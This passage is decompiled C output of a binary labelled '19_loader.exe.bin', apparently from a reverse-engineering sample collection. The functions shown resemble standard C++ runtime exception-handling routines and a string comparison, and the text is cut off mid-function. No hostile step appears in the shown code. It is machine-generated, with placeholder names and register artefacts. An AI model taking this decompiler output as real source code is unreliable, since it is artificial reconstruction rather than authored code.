undefined8 FUN_14001ea00(byte *param_1,byte *param_2,uint *param_3)

{
  char cVar1;
  char cVar2;
  int iVar3;
  uint uVar4;
  longlong lVar5;
  longlong lVar6;
  char *pcVar7;
  
  iVar3 = *(int *)(param_1 + 4);
  if (iVar3 == 0) {
    return 1;
  }
  lVar5 = FUN_1400194c0();
  if (lVar5 + iVar3 == 0) {
    return 1;
  }
  iVar3 = *(int *)(param_1 + 4);
  if (iVar3 == 0) {
    lVar5 = 0;
  }
  else {
    lVar5 = FUN_1400194c0();
    lVar5 = lVar5 + iVar3;
  }
  if (*(char *)(lVar5 + 0x10) == '\0') {
    return 1;
  }
  if (((*param_1 & 0x80) != 0) && ((*param_2 & 0x10) != 0)) {
    return 1;
  }
  iVar3 = *(int *)(param_1 + 4);
  if (iVar3 == 0) {
    lVar5 = 0;
  }
  else {
    lVar5 = FUN_1400194c0();
    lVar5 = lVar5 + iVar3;
  }
  lVar6 = FUN_140019500();
  if (lVar5 != *(int *)(param_2 + 4) + lVar6) {
    iVar3 = *(int *)(param_1 + 4);
    if (iVar3 == 0) {
      lVar5 = 0;
    }
    else {
      lVar5 = FUN_1400194c0();
      lVar5 = lVar5 + iVar3;
    }
    iVar3 = *(int *)(param_2 + 4);
    lVar6 = FUN_140019500();
    pcVar7 = (char *)(lVar5 + 0x10);
    lVar5 = ((longlong)iVar3 + 0x10 + lVar6) - (longlong)pcVar7;
    do {
      cVar1 = *pcVar7;
      cVar2 = pcVar7[lVar5];
      if (cVar1 != cVar2) break;
      pcVar7 = pcVar7 + 1;
    } while (cVar2 != '\0');
    if (cVar1 != cVar2) {
      return 0;
    }
  }
  if ((((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&
       ((uVar4 = *param_3, (uVar4 & 1) == 0 || ((*param_1 & 1) != 0)))) &&
      (((uVar4 & 4) == 0 || ((*param_1 & 4) != 0)))) &&
     (((uVar4 & 2) == 0 || ((*param_1 & 2) != 0)))) {
    return 1;
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1ea5a | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001ea5a rva=0x1ea5a */

undefined8 FUN_14001ea5a(void)

{
  char cVar1;
  char cVar2;
  int iVar3;
  uint uVar4;
  longlong lVar5;
  longlong lVar6;
  char *pcVar7;
  byte *unaff_RBP;
  byte *unaff_RDI;
  uint *unaff_R14;
  
  iVar3 = *(int *)(unaff_RDI + 4);
  if (iVar3 == 0) {
    lVar5 = 0;
  }
  else {
    lVar5 = FUN_1400194c0();
    lVar5 = lVar5 + iVar3;
  }
  lVar6 = FUN_140019500();
  if (lVar5 != *(int *)(unaff_RBP + 4) + lVar6) {
    iVar3 = *(int *)(unaff_RDI + 4);
    if (iVar3 == 0) {
      lVar5 = 0;
    }
    else {
      lVar5 = FUN_1400194c0();
      lVar5 = lVar5 + iVar3;
    }
    iVar3 = *(int *)(unaff_RBP + 4);
    lVar6 = FUN_140019500();
    pcVar7 = (char *)(lVar5 + 0x10);
    lVar5 = ((longlong)iVar3 + 0x10 + lVar6) - (longlong)pcVar7;
    do {
      cVar1 = *pcVar7;
      cVar2 = pcVar7[lVar5];
      if (cVar1 != cVar2) break;
      pcVar7 = pcVar7 + 1;
    } while (cVar2 != '\0');
    if (cVar1 != cVar2) {
      return 0;
    }
  }
  if ((((((*unaff_RBP & 2) == 0) || ((*unaff_RDI & 8) != 0)) &&
       ((uVar4 = *unaff_R14, (uVar4 & 1) == 0 || ((*unaff_RDI & 1) != 0)))) &&
      (((uVar4 & 4) == 0 || ((*unaff_RDI & 4) != 0)))) &&
     (((uVar4 & 2) == 0 || ((*unaff_RDI & 2) != 0)))) {
    return 1;
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1ead9 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001ead9 rva=0x1ead9 */

undefined8 FUN_14001ead9(void)

{
  uint uVar1;
  byte *unaff_RBP;
  byte *unaff_RDI;
  uint *unaff_R14;
  
  if ((((((*unaff_RBP & 2) == 0) || ((*unaff_RDI & 8) != 0)) &&
       ((uVar1 = *unaff_R14, (uVar1 & 1) == 0 || ((*unaff_RDI & 1) != 0)))) &&
      (((uVar1 & 4) == 0 || ((*unaff_RDI & 4) != 0)))) &&
     (((uVar1 & 2) == 0 || ((*unaff_RDI & 2) != 0)))) {
    return 1;
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1eb16 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001eb16 rva=0x1eb16 */

undefined8 FUN_14001eb16(void)

{
  return 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1eb30 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001eb30 rva=0x1eb30 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

char FUN_14001eb30(longlong param_1,longlong *param_2,uint *param_3,byte *param_4)

{
  uint uVar1;
  int iVar2;
  longlong lVar3;
  longlong lVar4;
  undefined8 *puVar5;
  
  uVar1 = param_3[1];
  if ((uVar1 != 0) && (lVar4 = FUN_1400194c0(), lVar4 + (int)uVar1 != 0)) {
    uVar1 = param_3[1];
    if (uVar1 == 0) {
      lVar4 = 0;
    }
    else {
      lVar4 = FUN_1400194c0();
      lVar4 = lVar4 + (int)uVar1;
    }
    if ((*(char *)(lVar4 + 0x10) != '\0') && ((param_3[2] != 0 || ((int)*param_3 < 0)))) {
      uVar1 = *param_3;
      if (-1 < (int)uVar1) {
        param_2 = (longlong *)((longlong)(int)param_3[2] + *param_2);
      }
      if ((((char)uVar1 < '\0') && ((*param_4 & 0x10) != 0)) && (DAT_1400e07a0 != 0)) {
        lVar4 = (*(code *)DAT_1400e07a0)();
        if ((lVar4 == 0) || (param_2 == (longlong *)0x0)) {
                    /* WARNING: Subroutine does not return */
          FUN_1400160f8();
        }
        *param_2 = lVar4;
        lVar4 = FUN_140014a70(lVar4,(int *)(param_4 + 8));
        *param_2 = lVar4;
      }
      else if ((uVar1 & 8) == 0) {
        if ((*param_4 & 1) == 0) {
          iVar2 = *(int *)(param_4 + 0x18);
          if (iVar2 == 0) {
            lVar4 = 0;
          }
          else {
            lVar4 = FUN_140019500();
            lVar4 = lVar4 + iVar2;
          }
          lVar3 = *(longlong *)(param_1 + 0x28);
          if (lVar4 != 0) {
            if (((lVar3 == 0) || (param_2 == (longlong *)0x0)) ||
               ((iVar2 = *(int *)(param_4 + 0x18), iVar2 == 0 ||
                (lVar4 = FUN_140019500(), lVar4 + iVar2 == 0)))) {
                    /* WARNING: Subroutine does not return */
              FUN_1400160f8();
            }
            return ((*param_4 & 4) != 0) + '\x01';
          }
          if ((lVar3 == 0) || (param_2 == (longlong *)0x0)) {
                    /* WARNING: Subroutine does not return */
            FUN_1400160f8();
          }
          iVar2 = *(int *)(param_4 + 0x14);
          puVar5 = (undefined8 *)FUN_140014a70(lVar3,(int *)(param_4 + 8));
          FUN_140021f30(param_2,puVar5,(longlong)iVar2);
        }
        else {
          if ((*(undefined8 **)(param_1 + 0x28) == (undefined8 *)0x0) ||
             (param_2 == (longlong *)0x0)) {
                    /* WARNING: Subroutine does not return */
            FUN_1400160f8();
          }
          FUN_140021f30(param_2,*(undefined8 **)(param_1 + 0x28),(longlong)*(int *)(param_4 + 0x14))
          ;
          if ((*(int *)(param_4 + 0x14) == 8) && (*param_2 != 0)) {
            lVar4 = FUN_140014a70(*param_2,(int *)(param_4 + 8));
            *param_2 = lVar4;
          }
        }
      }
      else {
        lVar4 = *(longlong *)(param_1 + 0x28);
        if ((lVar4 == 0) || (param_2 == (longlong *)0x0)) {
                    /* WARNING: Subroutine does not return */
          FUN_1400160f8();
        }
        *param_2 = lVar4;
        lVar4 = FUN_140014a70(lVar4,(int *)(param_4 + 8));
        *param_2 = lVar4;
      }
      return '\0';
    }
  }
  return '\0';
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1ed10 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001ed10 rva=0x1ed10 */

void FUN_14001ed10(longlong param_1,longlong *param_2,uint *param_3,byte *param_4)

{
  char cVar1;
  int iVar2;
  undefined7 extraout_var;
  longlong lVar3;
  longlong lVar4;
  undefined *puVar5;
  longlong *plVar6;
  
  if ((int)*param_3 < 0) {
    plVar6 = param_2;
  }
  else {
    plVar6 = (longlong *)((longlong)(int)param_3[2] + *param_2);
  }
  cVar1 = FUN_14001eb30(param_1,param_2,param_3,param_4);
  iVar2 = (int)CONCAT71(extraout_var,cVar1);
  if (iVar2 == 1) {
    lVar3 = FUN_140014a70(*(longlong *)(param_1 + 0x28),(int *)(param_4 + 8));
    iVar2 = *(int *)(param_4 + 0x18);
    if (iVar2 == 0) {
      puVar5 = (undefined *)0x0;
    }
    else {
      lVar4 = FUN_140019500();
      puVar5 = (undefined *)(lVar4 + iVar2);
    }
    FUN_14001e660(plVar6,puVar5,lVar3);
  }
  else if (iVar2 == 2) {
    lVar3 = FUN_140014a70(*(longlong *)(param_1 + 0x28),(int *)(param_4 + 8));
    iVar2 = *(int *)(param_4 + 0x18);
    if (iVar2 == 0) {
      puVar5 = (undefined *)0x0;
    }
    else {
      lVar4 = FUN_140019500();
      puVar5 = (undefined *)(lVar4 + iVar2);
    }
    FUN_14001e670(plVar6,puVar5,lVar3,1);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1edd0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001edd0 rva=0x1edd0 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

undefined8
FUN_14001edd0(int *param_1,longlong *param_2,ULONG_PTR param_3,ulonglong *param_4,uint *param_5,
             int param_6,undefined8 param_7,byte param_8)

{
  uint uVar1;
  int iVar2;
  PVOID pvVar3;
  longlong lVar4;
  code *pcVar5;
  undefined8 uVar6;
  bool bVar7;
  undefined8 in_stack_ffffffffffffffb0;
  undefined4 uVar8;
  
  uVar8 = (undefined4)((ulonglong)in_stack_ffffffffffffffb0 >> 0x20);
  FUN_1400160c0(param_3);
  pvVar3 = FUN_1400161f0();
  if ((*(int *)((longlong)pvVar3 + 0x40) == 0) && (iVar2 = *param_1, iVar2 != -0x1f928c9d)) {
    if (iVar2 == -0x7fffffd7) {
      if (param_1[6] == 0xf) {
        bVar7 = *(longlong *)(param_1 + 0x18) == 0x19930520;
        goto LAB_14001ee29;
      }
    }
    else {
      bVar7 = iVar2 == -0x7fffffda;
LAB_14001ee29:
      if (bVar7) goto LAB_14001ee43;
    }
    if ((0x19930521 < (*param_5 & 0x1fffffff)) && ((param_5[9] & 1) != 0)) {
      return 1;
    }
  }
LAB_14001ee43:
  if ((param_1[1] & 0x66U) == 0) {
    if ((param_5[3] == 0) &&
       ((((*param_5 & 0x1fffffff) < 0x19930521 || (uVar1 = param_5[8], uVar1 == 0)) ||
        (lVar4 = FUN_1400194c0(), lVar4 + (int)uVar1 == 0)))) {
      if ((*param_5 & 0x1fffffff) < 0x19930522) {
        return 1;
      }
      if ((param_5[9] & 4) == 0) {
        return 1;
      }
    }
    if (((*param_1 == -0x1f928c9d) && (2 < (uint)param_1[6])) &&
       ((0x19930522 < (uint)param_1[8] &&
        (iVar2 = *(int *)(*(longlong *)(param_1 + 0xc) + 8), iVar2 != 0)))) {
      lVar4 = FUN_140019500();
      pcVar5 = (code *)(lVar4 + iVar2);
      if (pcVar5 != (code *)0x0) {
        uVar6 = (*pcVar5)(param_1,param_2,param_3,param_4,param_5,param_6,param_7,
                          CONCAT44(uVar8,(uint)param_8));
        return uVar6;
      }
    }
    FUN_14001f000(param_1,param_2,param_3,param_4,param_5,param_8,param_6,param_7);
    return 1;
  }
  if (param_5[1] == 0) {
    return 1;
  }
  if (param_6 != 0) {
    return 1;
  }
  if ((param_1[1] & 0x20U) == 0) {
LAB_14001eedd:
    FUN_140019030(param_2,param_4,(longlong)param_5);
    return 1;
  }
  if (*param_1 == -0x7fffffda) {
    iVar2 = FUN_14001e120((longlong)param_5,(longlong)param_4,param_4[4]);
    if ((-2 < iVar2) && (iVar2 < (int)param_5[1])) {
      FUN_14001e2a0(param_2,param_4,(longlong)param_5,iVar2);
      return 1;
    }
  }
  else {
    if (*param_1 != -0x7fffffd7) goto LAB_14001eedd;
    iVar2 = param_1[0xe];
    if ((-2 < iVar2) && (iVar2 < (int)param_5[1])) {
      FUN_14001e2a0(*(longlong **)(param_1 + 10),param_4,(longlong)param_5,iVar2);
      return 1;
    }
  }
                    /* WARNING: Subroutine does not return */
  FUN_1400160f8();
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1f000 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001f000 rva=0x1f000 */

void FUN_14001f000(int *param_1,longlong *param_2,ULONG_PTR param_3,ulonglong *param_4,uint *param_5
                  ,byte param_6,undefined4 param_7,undefined8 param_8)

{
  uint uVar1;
  int iVar2;
  code *pcVar3;
  char cVar4;
  bool bVar5;
  int iVar6;
  PVOID pvVar7;
  ulonglong uVar8;
  longlong lVar9;
  undefined8 uVar10;
  longlong *plVar11;
  longlong lVar12;
  int *piVar13;
  byte *pbVar14;
  uint uVar15;
  uint uVar16;
  undefined1 auStackY_138 [32];
  undefined8 in_stack_ffffffffffffff00;
  undefined4 uVar17;
  int local_d8;
  ULONG_PTR local_d0;
  longlong *local_c8;
  undefined4 local_c0;
  int local_bc;
  longlong *local_b8;
  longlong local_b0;
  longlong local_a8;
  uint *local_a0;
  ulonglong local_98;
  longlong *local_90;
  uint local_88;
  uint local_78;
  longlong local_70;
  undefined8 uStack_68;
  undefined4 local_60;
  ulonglong local_58;
  
  local_58 = DAT_1400dfc40 ^ (ulonglong)auStackY_138;
  local_b8 = param_2;
  local_d8 = FUN_14001e0b0((longlong)param_5,param_4);
  FUN_140019160(param_2,param_4,(longlong)param_5,(longlong *)&local_c8);
  iVar6 = FUN_14001e270(param_2,param_4,(longlong)param_5);
  if (iVar6 < local_d8) {
    FUN_14001e220((longlong *)&local_c8,param_4,(longlong)param_5,local_d8);
    FUN_14001e230(param_2,param_4,(longlong)param_5,local_d8);
  }
  else {
    local_d8 = FUN_14001e270(param_2,param_4,(longlong)param_5);
  }
  if ((-2 < local_d8) && (local_d8 < (int)param_5[1])) {
    local_d0 = param_3;
    if ((*param_1 == -0x1f928c9d) &&
       (((param_1[6] == 4 && (param_1[8] + 0xe66cfae0U < 3)) && (*(longlong *)(param_1 + 0xc) == 0))
       )) {
      pvVar7 = FUN_1400161f0();
      if (*(longlong *)((longlong)pvVar7 + 0x20) == 0) goto LAB_14001f528;
      pvVar7 = FUN_1400161f0();
      param_1 = *(int **)((longlong)pvVar7 + 0x20);
      pvVar7 = FUN_1400161f0();
      local_d0 = *(ULONG_PTR *)((longlong)pvVar7 + 0x28);
      FUN_140019520(*(undefined8 *)(param_1 + 0xe));
      if ((param_1 == (int *)0x0) ||
         (((*param_1 == -0x1f928c9d && (param_1[6] == 4)) &&
          ((param_1[8] + 0xe66cfae0U < 3 && (*(longlong *)(param_1 + 0xc) == 0))))))
      goto LAB_14001f5a1;
      pvVar7 = FUN_1400161f0();
      if (*(longlong *)((longlong)pvVar7 + 0x38) != 0) {
        pvVar7 = FUN_1400161f0();
        piVar13 = *(int **)((longlong)pvVar7 + 0x38);
        pvVar7 = FUN_1400161f0();
        *(undefined8 *)((longlong)pvVar7 + 0x38) = 0;
        cVar4 = FUN_14001e850((longlong)param_1,piVar13);
        if (cVar4 == '\0') {
          uVar8 = FUN_14001e960(piVar13);
          if ((char)uVar8 == '\0') {
                    /* WARNING: Subroutine does not return */
            FUN_140015f5c();
          }
          FUN_140014960(param_1);
          FUN_14001e730(&local_70);
          FUN_140021370(&local_70,&DAT_1400952e0);
          pcVar3 = (code *)swi(3);
          (*pcVar3)();
          return;
        }
      }
    }
    uVar17 = (undefined4)((ulonglong)in_stack_ffffffffffffff00 >> 0x20);
    local_98 = param_4[1];
    local_a0 = param_5;
    if (((*param_1 == -0x1f928c9d) && (param_1[6] == 4)) && (param_1[8] + 0xe66cfae0U < 3)) {
      if (param_5[3] != 0) {
        FUN_140019390(&local_90,&local_a0,local_d8,param_4,(longlong)param_5);
        uVar17 = (undefined4)((ulonglong)in_stack_ffffffffffffff00 >> 0x20);
        local_c8 = local_90;
        uVar15 = local_88;
        if (local_88 < local_78) {
          do {
            lVar12 = local_90[1];
            lVar9 = (longlong)*(int *)(*local_90 + 0x10) + (ulonglong)uVar15 * 0x14;
            local_bc = *(int *)(lVar9 + lVar12);
            if (local_bc <= local_d8) {
              if (local_d8 <= *(int *)(lVar9 + 4 + lVar12)) {
                local_c0 = *(undefined4 *)(lVar9 + 8 + lVar12);
                uVar8 = 0;
                uVar1 = *(uint *)(lVar9 + 0xc + lVar12);
                local_b0 = (longlong)*(int *)(lVar9 + 0x10 + lVar12) + param_4[1];
                if (uVar1 != 0) {
                  do {
                    plVar11 = (longlong *)(local_b0 + uVar8 * 0x14);
                    local_70 = *plVar11;
                    uStack_68 = plVar11[1];
                    local_60 = *(undefined4 *)(local_b0 + 0x10 + uVar8 * 0x14);
                    iVar6 = *(int *)(*(longlong *)(param_1 + 0xc) + 0xc);
                    lVar9 = FUN_140019500();
                    piVar13 = (int *)((longlong)iVar6 + lVar9 + 4);
                    iVar6 = *(int *)(*(longlong *)(param_1 + 0xc) + 0xc);
                    lVar9 = FUN_140019500();
                    local_90 = local_c8;
                    for (iVar6 = *(int *)(lVar9 + iVar6); local_c8 = local_90, 0 < iVar6;
                        iVar6 = iVar6 + -1) {
                      iVar2 = *piVar13;
                      lVar9 = FUN_140019500();
                      pbVar14 = (byte *)(iVar2 + lVar9);
                      uVar10 = FUN_14001ea00((byte *)&local_70,pbVar14,*(uint **)(param_1 + 0xc));
                      param_2 = local_b8;
                      uVar17 = (undefined4)((ulonglong)in_stack_ffffffffffffff00 >> 0x20);
                      if ((int)uVar10 != 0) {
                        plVar11 = FUN_140019160(local_b8,param_4,(longlong)param_5,&local_a8);
                        if (pbVar14 != (byte *)0x0) {
                          FUN_14001ed10((longlong)param_1,plVar11,(uint *)&local_70,pbVar14);
                        }
                        lVar12 = (longlong)uStack_68._4_4_;
                        lVar9 = FUN_1400194c0();
                        in_stack_ffffffffffffff00 = CONCAT44(uVar17,local_c0);
                        FUN_140019260(param_2,(ULONG_PTR)param_1,local_d0,(ULONG_PTR)plVar11,
                                      lVar9 + lVar12,(ULONG_PTR)param_5,local_bc,
                                      in_stack_ffffffffffffff00,&local_70,param_4,param_6);
                        local_90 = local_c8;
                        goto LAB_14001f3f6;
                      }
                      piVar13 = piVar13 + 1;
                      local_90 = local_c8;
                    }
                    uVar16 = (int)uVar8 + 1;
                    uVar8 = (ulonglong)uVar16;
                  } while (uVar16 != uVar1);
                }
                param_2 = local_b8;
              }
            }
LAB_14001f3f6:
            uVar17 = (undefined4)((ulonglong)in_stack_ffffffffffffff00 >> 0x20);
            uVar15 = uVar15 + 1;
          } while (uVar15 < local_78);
        }
      }
      if ((0x19930520 < (*param_5 & 0x1fffffff)) &&
         (((uVar15 = param_5[8], uVar15 != 0 && (lVar9 = FUN_1400194c0(), lVar9 + (int)uVar15 != 0))
          || (((param_5[9] & 4) != 0 && (bVar5 = FUN_140018fc0(param_4,(longlong)param_5), !bVar5)))
          ))) {
        if ((param_5[9] & 4) != 0) {
          pvVar7 = FUN_1400161f0();
          *(int **)((longlong)pvVar7 + 0x20) = param_1;
          pvVar7 = FUN_1400161f0();
          *(ULONG_PTR *)((longlong)pvVar7 + 0x28) = local_d0;
                    /* WARNING: Subroutine does not return */
          FUN_140015f5c();
        }
        uVar15 = param_5[8];
        if (uVar15 == 0) {
          piVar13 = (int *)0x0;
        }
        else {
          lVar9 = FUN_1400194c0();
          piVar13 = (int *)((int)uVar15 + lVar9);
        }
        cVar4 = FUN_14001e850((longlong)param_1,piVar13);
        if (cVar4 == '\0') {
          plVar11 = FUN_140019160(param_2,param_4,(longlong)param_5,&local_a8);
          FUN_140019260(param_2,(ULONG_PTR)param_1,local_d0,(ULONG_PTR)plVar11,0,(ULONG_PTR)param_5,
                        -1,CONCAT44(uVar17,0xffffffff),0,param_4,param_6);
        }
      }
    }
    else if (param_5[3] != 0) {
      if (param_6 != 0) goto LAB_14001f5a1;
      FUN_14001f5b0(param_1,param_2,local_d0,(longlong)param_4,(longlong)param_5,local_d8,param_7,
                    param_8);
    }
    pvVar7 = FUN_1400161f0();
    if (*(longlong *)((longlong)pvVar7 + 0x38) == 0) {
LAB_14001f528:
      FUN_14001a2d0(local_58 ^ (ulonglong)auStackY_138);
      return;
    }
  }
LAB_14001f5a1:
                    /* WARNING: Subroutine does not return */
  FUN_1400160f8();
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1f5b0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001f5b0 rva=0x1f5b0 */

void FUN_14001f5b0(int *param_1,longlong *param_2,ULONG_PTR param_3,longlong param_4,
                  longlong param_5,int param_6,undefined4 param_7,undefined8 param_8)

{
  int iVar1;
  int iVar2;
  int iVar3;
  PVOID pvVar4;
  PVOID pvVar5;
  undefined8 uVar6;
  longlong lVar7;
  longlong *plVar8;
  byte *pbVar9;
  uint uVar10;
  int *piVar11;
  undefined4 in_stack_ffffffffffffff64;
  longlong lStack_70;
  longlong lStack_68;
  undefined8 uStack_60;
  longlong *plStack_58;
  uint uStack_50;
  uint uStack_40;
  
  if (*param_1 != -0x7ffffffd) {
    pvVar4 = FUN_1400161f0();
    if (*(longlong *)((longlong)pvVar4 + 0x10) != 0) {
      pvVar4 = FUN_1400161f0();
      pvVar4 = *(PVOID *)((longlong)pvVar4 + 0x10);
      pvVar5 = EncodePointer((PVOID)0x0);
      if ((((pvVar4 != pvVar5) && (*param_1 != -0x1fbcb0b3)) && (*param_1 != -0x1fbcbcae)) &&
         (uVar6 = FUN_140019660(param_1,param_2,param_3), (int)uVar6 != 0)) {
        return;
      }
    }
    uStack_60 = *(undefined8 *)(param_4 + 8);
    lStack_68 = param_5;
    if (*(int *)(param_5 + 0xc) == 0) {
                    /* WARNING: Subroutine does not return */
      FUN_1400160f8();
    }
    FUN_140019390(&plStack_58,&lStack_68,param_6,(ulonglong *)param_4,param_5);
    uVar10 = uStack_50;
    if (uStack_50 < uStack_40) {
      do {
        piVar11 = (int *)((longlong)*(int *)(*plStack_58 + 0x10) + (ulonglong)uVar10 * 0x14 +
                         plStack_58[1]);
        iVar1 = *piVar11;
        if ((iVar1 <= param_6) && (param_6 <= piVar11[1])) {
          iVar2 = piVar11[2];
          pbVar9 = (byte *)(*(longlong *)(param_4 + 8) + -0x14 +
                           (longlong)piVar11[4] + (ulonglong)(uint)piVar11[3] * 0x14);
          iVar3 = *(int *)(pbVar9 + 4);
          if ((iVar3 != 0) && (lVar7 = FUN_1400194c0(), lVar7 + iVar3 != 0)) {
            iVar3 = *(int *)(pbVar9 + 4);
            if (iVar3 == 0) {
              lVar7 = 0;
            }
            else {
              lVar7 = FUN_1400194c0();
              lVar7 = lVar7 + iVar3;
            }
            if (*(char *)(lVar7 + 0x10) != '\0') goto LAB_14001f7bd;
          }
          if ((*pbVar9 & 0x40) == 0) {
            plVar8 = FUN_140019160(param_2,(ulonglong *)param_4,param_5,&lStack_70);
            lVar7 = FUN_1400194c0();
            FUN_140019260(param_2,(ULONG_PTR)param_1,param_3,(ULONG_PTR)plVar8,
                          *(int *)(pbVar9 + 0xc) + lVar7,param_5,iVar1,
                          CONCAT44(in_stack_ffffffffffffff64,iVar2),pbVar9,(undefined8 *)param_4,0);
          }
        }
LAB_14001f7bd:
        uVar10 = uVar10 + 1;
      } while (uVar10 < uStack_40);
    }
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1f5e5 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001f5e5 rva=0x1f5e5 */

void FUN_14001f5e5(void)

{
  int iVar1;
  int iVar2;
  longlong in_RAX;
  PVOID pvVar3;
  PVOID pvVar4;
  undefined8 uVar5;
  longlong lVar6;
  longlong *plVar7;
  undefined8 unaff_RBX;
  undefined8 unaff_RBP;
  int *unaff_RSI;
  byte *pbVar8;
  uint uVar9;
  undefined8 unaff_RDI;
  int *piVar10;
  undefined8 unaff_R12;
  undefined8 unaff_R13;
  ulonglong *unaff_R14;
  undefined8 unaff_R15;
  undefined4 in_stack_0000003c;
  int iStack0000000000000060;
  longlong lStack0000000000000068;
  undefined1 uStack0000000000000070;
  ulonglong uStack0000000000000078;
  undefined8 uStack0000000000000080;
  uint in_stack_00000088;
  uint in_stack_00000098;
  ULONG_PTR in_stack_000000e0;
  longlong *in_stack_000000e8;
  ULONG_PTR in_stack_000000f0;
  ULONG_PTR in_stack_00000100;
  int in_stack_00000108;
  
  *(undefined8 *)(in_RAX + -0x28) = unaff_RBP;
  *(undefined8 *)(in_RAX + -0x30) = unaff_RDI;
  *(undefined8 *)(in_RAX + -0x38) = unaff_R12;
  *(undefined8 *)(in_RAX + 0x20) = unaff_RBX;
  pvVar3 = FUN_1400161f0();
  if (*(longlong *)((longlong)pvVar3 + 0x10) != 0) {
    pvVar3 = FUN_1400161f0();
    pvVar3 = *(PVOID *)((longlong)pvVar3 + 0x10);
    pvVar4 = EncodePointer((PVOID)0x0);
    if ((((pvVar3 != pvVar4) && (*unaff_RSI != -0x1fbcb0b3)) && (*unaff_RSI != -0x1fbcbcae)) &&
       (uVar5 = FUN_140019660(unaff_RSI,unaff_R15,unaff_R13), (int)uVar5 != 0)) {
      return;
    }
  }
  uStack0000000000000078 = unaff_R14[1];
  _uStack0000000000000070 = in_stack_00000100;
  if (*(int *)(in_stack_00000100 + 0xc) == 0) {
                    /* WARNING: Subroutine does not return */
    FUN_1400160f8();
  }
  FUN_140019390(&uStack0000000000000080,&uStack0000000000000070,in_stack_00000108,unaff_R14,
                in_stack_00000100);
  uVar9 = in_stack_00000088;
  if (in_stack_00000088 < in_stack_00000098) {
    do {
      piVar10 = (int *)((longlong)*(int *)(*uStack0000000000000080 + 0x10) + (ulonglong)uVar9 * 0x14
                       + uStack0000000000000080[1]);
      iVar1 = *piVar10;
      if ((iVar1 <= in_stack_00000108) && (in_stack_00000108 <= piVar10[1])) {
        iStack0000000000000060 = piVar10[2];
        pbVar8 = (byte *)((unaff_R14[1] - 0x14) +
                         (longlong)piVar10[4] + (ulonglong)(uint)piVar10[3] * 0x14);
        iVar2 = *(int *)(pbVar8 + 4);
        if ((iVar2 != 0) && (lVar6 = FUN_1400194c0(), lVar6 + iVar2 != 0)) {
          iVar2 = *(int *)(pbVar8 + 4);
          if (iVar2 == 0) {
            lVar6 = 0;
          }
          else {
            lVar6 = FUN_1400194c0();
            lVar6 = lVar6 + iVar2;
          }
          if (*(char *)(lVar6 + 0x10) != '\0') goto LAB_14001f7bd;
        }
        if ((*pbVar8 & 0x40) == 0) {
          plVar7 = FUN_140019160(in_stack_000000e8,unaff_R14,in_stack_00000100,
                                 &lStack0000000000000068);
          lVar6 = FUN_1400194c0();
          FUN_140019260(in_stack_000000e8,in_stack_000000e0,in_stack_000000f0,(ULONG_PTR)plVar7,
                        *(int *)(pbVar8 + 0xc) + lVar6,in_stack_00000100,iVar1,
                        CONCAT44(in_stack_0000003c,iStack0000000000000060),pbVar8,unaff_R14,0);
        }
      }
LAB_14001f7bd:
      uVar9 = uVar9 + 1;
    } while (uVar9 < in_stack_00000098);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1f7ec | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001f7ec rva=0x1f7ec */

void FUN_14001f7ec(void)

{
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1f7fb | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001f7fb rva=0x1f7fb */

void thunk_FUN_1400160f8(void)

{
                    /* WARNING: Subroutine does not return */
  FUN_1400160f8();
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1f810 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001f810 rva=0x1f810 */

int FUN_14001f810(ushort *param_1,ushort *param_2,longlong param_3)

{
  ushort uVar1;
  ushort uVar2;
  uint uVar3;
  uint uVar4;
  
  if (param_3 == 0) {
    return 0;
  }
  do {
    uVar1 = *param_1;
    uVar3 = (uint)uVar1;
    param_1 = param_1 + 1;
    uVar2 = *param_2;
    uVar4 = (uint)uVar2;
    param_2 = param_2 + 1;
    if ((uint)uVar1 != (uint)uVar2) {
      uVar3 = uVar1 + 0x20;
      if (0x19 < uVar1 - 0x41) {
        uVar3 = (uint)uVar1;
      }
      uVar4 = uVar2 + 0x20;
      if (0x19 < uVar2 - 0x41) {
        uVar4 = (uint)uVar2;
      }
    }
  } while (((uVar3 - uVar4 == 0) && (uVar3 != 0)) && (param_3 = param_3 + -1, param_3 != 0));
  return uVar3 - uVar4;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1f880 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001f880 rva=0x1f880 */

void FUN_14001f880(undefined1 *param_1,ulonglong param_2,ulonglong param_3,undefined *param_4)

{
  undefined1 uVar1;
  int iVar2;
  undefined8 *puVar3;
  undefined1 *puVar4;
  longlong lVar5;
  undefined1 *puVar6;
  undefined1 *puVar7;
  undefined1 *puVar8;
  ulonglong uVar9;
  undefined1 *puVar10;
  undefined1 auStack_468 [32];
  longlong lStack_448;
  undefined8 local_438 [62];
  undefined8 local_248 [62];
  ulonglong local_58;
  
  local_58 = DAT_1400dfc40 ^ (ulonglong)auStack_468;
  if ((((param_1 == (undefined1 *)0x0) && (param_2 != 0)) || (param_3 == 0)) ||
     (param_4 == (undefined *)0x0)) {
    puVar3 = FUN_140018dec();
